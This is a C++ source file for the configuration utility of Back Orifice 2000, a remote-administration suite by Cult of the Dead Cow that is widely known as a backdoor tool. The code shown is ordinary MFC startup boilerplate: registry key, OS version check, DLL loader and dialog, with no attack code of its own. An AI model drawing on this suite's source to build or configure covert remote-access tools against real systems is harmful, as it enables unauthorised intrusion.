/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */


// bo2kcfg.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "bo2kcfg.h"
#include "bo2kcfgDlg.h"
#include "osversion.h"
#include "dll_load.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CBo2kcfgApp

BEGIN_MESSAGE_MAP(CBo2kcfgApp, CWinApp)
	//{{AFX_MSG_MAP(CBo2kcfgApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG
	ON_COMMAND(ID_HELP, CWinApp::OnHelp)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBo2kcfgApp construction

CBo2kcfgApp::CBo2kcfgApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CBo2kcfgApp object

CBo2kcfgApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CBo2kcfgApp initialization

BOOL CBo2kcfgApp::InitInstance()
{
	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

	SetRegistryKey(_T("Cult Of The Dead Cow"));

	// Get Operating System Version
	GetOSVersion();
	
	// Start up DLL Loader
	InitializeDLLLoad();
	
	// Do modal dialog
	CBo2kcfgDlg dlg;
	m_pMainWnd = &dlg;
	int nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{
	
	}

	// Release DLL Loader
	KillDLLLoad();


	return FALSE;
}

void CBo2kcfgApp::SetRegKey(char *svKey)
{
	SetRegistryKey(svKey);
}